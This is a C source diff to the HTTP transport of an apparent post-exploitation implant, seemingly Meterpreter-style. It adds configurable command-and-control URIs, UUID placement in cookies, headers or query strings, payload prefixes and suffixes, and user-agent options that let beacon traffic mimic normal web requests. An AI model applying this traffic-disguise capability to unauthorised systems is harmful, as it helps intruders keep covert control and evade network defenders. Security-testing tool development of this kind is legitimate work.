@@ -9,6 +9,73 @@
 #include "packet_encryption.h"
 #include "pivot_packet_dispatch.h"
 
+#ifdef DEBUGTRACE
+#define DBG_PRINT_OPTIONS(t, o) debug_print_http_options(t, o)
+#else
+#define DBG_PRINT_OPTIONS(t, o)
+#endif
+
+static PWSTR generate_uri(HttpTransportContext* ctx, HttpConnection* conn)
+{
+	PWCHAR baseUri = ctx->default_options.uri;
+	if (conn->options.uri)
+	{
+		baseUri = conn->options.uri;
+	}
+
+	// If there's no URI for this connection, then the base URI is used, and that will (at least
+	// currently) contain the UUID string that's required. So we can just return that.
+	if (!conn->options.uri)
+	{
+		return _wcsdup(ctx->default_options.uri);
+	}
+
+	// If we do have a URi specified for this conneciton, we need to parse it. But only
+	// if the UUID location parameter is not specified in the cookie/httpheader/querystring
+	if (conn->options.uuid_cookie || conn->options.uuid_get || conn->options.uuid_header)
+	{
+		// return a copy of the baseUri in this case, the caller should free the result.
+		return _wcsdup(conn->options.uri);
+	}
+
+	// If we do need to put the UUID in the URI, the we need to pull it from the base URI
+	// and put it in place before any query string parameters in the current URI
+	PWCHAR queryString = wcschr(conn->options.uri, L'?');
+	dprintf("[GENURI] query string: %S", queryString);
+	size_t queryStringLen = queryString ? wcslen(queryString) : 0;
+	dprintf("[GENURI] query string len: %u", queryStringLen);
+	size_t baseUriLen = wcslen(conn->options.uri) - queryStringLen;
+	dprintf("[GENURI] base URI len: %u", baseUriLen);
+
+	// The base URI should contain the UUID string (for now) and shouldn't contain any query string
+	// parameters. Search for '/' from the second-last char in this URI
+	PWCHAR uuidUri = ctx->default_options.uri + wcslen(ctx->default_options.uri) - 1;
+	while (uuidUri > ctx->default_options.uri && *(--uuidUri) != L'/');
+
+	dprintf("[GENURI] uuid string: %S", uuidUri);
+	size_t uuidUriLen = wcslen(uuidUri);
+
+	// now let's clue the things together (with NULL terminator)
+	size_t uriLen = baseUriLen + queryStringLen + uuidUriLen + 1;
+	dprintf("[GENURI] Total URI length required: %u", uriLen);
+	PWCHAR uri = (PWCHAR)calloc(uriLen, sizeof(wchar_t));
+
+	wcsncpy_s(uri, uriLen, baseUri, baseUriLen);
+	dprintf("[GENURI] uri 1: %S", uri);
+	wcscat_s(uri, uriLen, uuidUri);
+	dprintf("[GENURI] uri 2: %S", uri);
+
+	if (queryString)
+	{
+		wcscat_s(uri, uriLen, queryString);
+		dprintf("[GENURI] uri 3: %S", uri);
+	}
+
+	dprintf("[GENURI] final URI: %S", uri);
+
+	return uri;
+}
+
 /*!
  * @brief Prepare a winHTTP request with the given context.
  * @param ctx Pointer to the HTTP transport context to prepare the request from.
@@ -28,15 +95,13 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 	}
 
 	HttpConnection* conn = isGet ? &ctx->get_connection : &ctx->post_connection;
-	PWCHAR uri = ctx->default_options.uri;
-	if (conn->options.uri)
-	{
-		// TODO OJ: include the default URI/UUID in here somehow?
-		uri = conn->options.uri;
-	}
+
+	PWSTR uri = generate_uri(ctx, conn);
 
 	vdprintf("[%s] opening request on connection %x to %S", direction, conn->connection, uri);
 	hReq = WinHttpOpenRequest(conn->connection, isGet ? L"GET" : L"POST", uri, NULL, NULL, NULL, flags);
+
+	free(uri);
 
 	if (hReq == NULL)
 	{
@@ -188,6 +253,35 @@ static BOOL read_response_winhttp(HANDLE hReq, LPVOID buffer, DWORD bytesToRead,
 	return WinHttpReadData(hReq, buffer, bytesToRead, bytesRead);
 }
 
+/*
+ * @brief Write a given payload to an open outbound HTTP request.
+ * @param hReq Handle to the open HTTP request.
+ * @param buffer Pointer to a buffer containing the data. Can be NULL.
+ * @param size Number of bytes to write from the \c buffer memory location.
+ * @return Indication of success/failure.
+ * @details This helper function is used to write data to outbound requests in batches, and is
+ * useful for when there are payload prefixes and suffixes in use. It can be called with
+ * \c NULL pointers and \c 0 size values so that the caller doesn't have to check for the
+ * validity of data sources.
+ */
+static BOOL write_to_request(HANDLE hReq, LPVOID buffer, DWORD size)
+{
+	if (buffer != NULL && size > 0)
+	{
+		LPBYTE data = (LPBYTE)buffer;
+		while (size > 0)
+		{
+			DWORD written = 0;
+			dprintf("[WINHTTP] writing data to request. %u (0x%x) from %p", size, size, data + written);
+			if (!WinHttpWriteData(hReq, data + written, size, &written))
+			{
+				return FALSE;
+			}
+			size -= written;
+		}
+	}
+	return TRUE;
+}
 
 /*!
  * @brief Wrapper around WinHTTP-specific sending functionality.
@@ -208,13 +302,28 @@ static BOOL send_request_winhttp(HttpTransportContext* ctx, HANDLE hReq, BOOL is
 		headers = conn->options.other_headers;
 	}
 
-	if (headers)
+	DWORD headerLength = headers == NULL ? 0 : -1L;
+	DWORD totalSize = size + conn->options.payload_prefix_size + conn->options.payload_suffix_size;
+
+	// Start a request without including any data
+	if (WinHttpSendRequest(hReq, headers, headerLength, NULL, 0, totalSize, 0))
 	{
-		dprintf("[WINHTTP] Sending with custom headers: %S", headers);
-		return WinHttpSendRequest(hReq, headers, -1L, buffer, size, size, 0);
+		dprintf("[WINHTTP] Sending prefix");
+		// Then write the prefix first
+		if (write_to_request(hReq, conn->options.payload_prefix, conn->options.payload_prefix_size))
+		{
+			dprintf("[WINHTTP] Sending payload");
+			// .. then the body
+			if (write_to_request(hReq, buffer, size))
+			{
+				dprintf("[WINHTTP] Sending suffix");
+				// .. then the suffix
+				return write_to_request(hReq, conn->options.payload_suffix, conn->options.payload_suffix_size);
+			}
+		}
 	}
 
-	return WinHttpSendRequest(hReq, NULL, 0, buffer, size, size, 0);
+	return FALSE;
 }
 
 /*!
@@ -262,6 +371,10 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx)
 			// indicate something is up.
 			return ERROR_BAD_CONFIGURATION;
 		}
+	}
+	else
+	{
+		vdprintf("[PACKET RECEIVE WINHTTP] Getting result code failed: %u 0x%x", GetLastError(), GetLastError());
 	}
 
 	if (ctx->cert_hash != NULL)
@@ -405,7 +518,7 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 			goto out;
 		}
 
-		vdprintf("[PACKET RECEIVE NHTTP] Data received: %u bytes", bytesRead);
+		vdprintf("[PACKET RECEIVE WINHTTP] Data received: %u bytes", bytesRead);
 
 		// If the response contains no data, this is fine, it just means the
 		// remote side had nothing to tell us. Indicate this through a
@@ -551,14 +664,17 @@ out:
 static DWORD server_init_connection(HttpTransportContext* ctx, HttpConnection* conn, PWSTR host, INTERNET_PORT port)
 {
 	// configure proxy
+	dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
+	PWSTR userAgent = conn->options.ua ? conn->options.ua : ctx->default_options.ua;
+
 	if (ctx->proxy)
 	{
 		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
-		conn->internet = WinHttpOpen(conn->options.ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
+		conn->internet = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 	else
 	{
-		conn->internet = WinHttpOpen(conn->options.ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+		conn->internet = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	}
 
 	if (!conn->internet)
@@ -620,7 +736,7 @@ static DWORD server_init_winhttp(Transport* transport)
 	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);
 
 	DWORD result = server_init_connection(ctx, &ctx->get_connection, tmpHostName, bits.nPort);
-	result = server_init_connection(ctx, &ctx->post_connection, tmpHostName, bits.nPort);
+	result = server_init_connection(ctx, &ctx->post_connection, tmpHostName, bits.nPort) && result;
 
 	transport->comms_last_packet = current_unix_timestamp();
 
@@ -849,6 +965,9 @@ static void destroy_options(HttpRequestOptions* options)
 	SAFE_FREE(options->payload_suffix);
 	SAFE_FREE(options->referrer);
 	SAFE_FREE(options->accept_types);
+	SAFE_FREE(options->uuid_cookie);
+	SAFE_FREE(options->uuid_header);
+	SAFE_FREE(options->uuid_get);
 }
 
 /*!
@@ -939,13 +1058,18 @@ void transport_write_http_config(Transport* transport, Packet* configPacket)
 
 BOOL get_http_options_from_tlv(Packet* packet, Tlv* optionsTlv, HttpRequestOptions* targetOptions)
 {
-	targetOptions->uri = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_URI, NULL);
-	targetOptions->other_headers = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_OTHER_HEADERS, NULL);
-	targetOptions->payload_prefix = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_PREFIX, NULL);
-	targetOptions->payload_suffix = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_SUFFIX, NULL);
-	targetOptions->referrer = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_REFERRER, NULL);
-	targetOptions->payload_skip_count = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SKIP_COUNT);
 	targetOptions->encode_flags = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_ENC);
+	targetOptions->other_headers = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_OTHER_HEADERS, NULL);
+	targetOptions->payload_prefix = packet_get_tlv_group_entry_value_raw(packet, optionsTlv, TLV_TYPE_C2_PREFIX, &targetOptions->payload_prefix_size);
+	targetOptions->payload_skip_count = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SKIP_COUNT);
+	targetOptions->payload_suffix = packet_get_tlv_group_entry_value_raw(packet, optionsTlv, TLV_TYPE_C2_SUFFIX, &targetOptions->payload_suffix_size);
+	targetOptions->referrer = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_REFERRER, NULL);
+	targetOptions->ua = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UA, NULL);
+	targetOptions->uri = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_URI, NULL);
+	targetOptions->accept_types = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_ACCEPT_TYPES, NULL);
+	targetOptions->uuid_cookie = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_COOKIE, NULL);
+	targetOptions->uuid_get = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_GET, NULL);
+	targetOptions->uuid_header = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_HEADER, NULL);
 
 	return TRUE;
 }
@@ -958,6 +1082,21 @@ BOOL get_http_options_from_config(Packet* packet, Tlv* c2Tlv, UINT tlvType, Http
 		return get_http_options_from_tlv(packet, &optionsTlv, targetOptions);
 	}
 	return FALSE;
+}
+
+static void debug_print_http_options(PSTR type, HttpRequestOptions* options)
+{
+	dprintf("[HTTP OPTION] - %s - Accept Types: %S", type, options->accept_types);
+	dprintf("[HTTP OPTION] - %s - Encode Flags: 0x%x", type, options->encode_flags);
+	dprintf("[HTTP OPTION] - %s - Other Headers: %S", type, options->other_headers);
+	dprintf("[HTTP OPTION] - %s - Payload Prefix Size: %u", type, options->payload_prefix_size);
+	dprintf("[HTTP OPTION] - %s - Payload Suffix Size: %u", type, options->payload_suffix_size);
+	dprintf("[HTTP OPTION] - %s - Referrer: %S", type, options->referrer);
+	dprintf("[HTTP OPTION] - %s - URI: %S", type, options->uri);
+	dprintf("[HTTP OPTION] - %s - UUID Cookie: %S", type, options->uuid_cookie);
+	dprintf("[HTTP OPTION] - %s - UUID Get: %S", type, options->uuid_get);
+	dprintf("[HTTP OPTION] - %s - UUID Header: %S", type, options->uuid_header);
+	dprintf("[HTTP OPTION] - %s - User Agent: %S", type, options->ua);
 }
 
 /*!
@@ -1034,6 +1173,10 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 	transport->ctx = ctx;
 	transport->comms_last_packet = current_unix_timestamp();
 	transport->write_config = transport_write_http_config;
+
+	DBG_PRINT_OPTIONS("Default", &ctx->default_options);
+	DBG_PRINT_OPTIONS("GET", &ctx->get_connection.options);
+	DBG_PRINT_OPTIONS("POST", &ctx->post_connection.options);
 
 	return transport;
 }
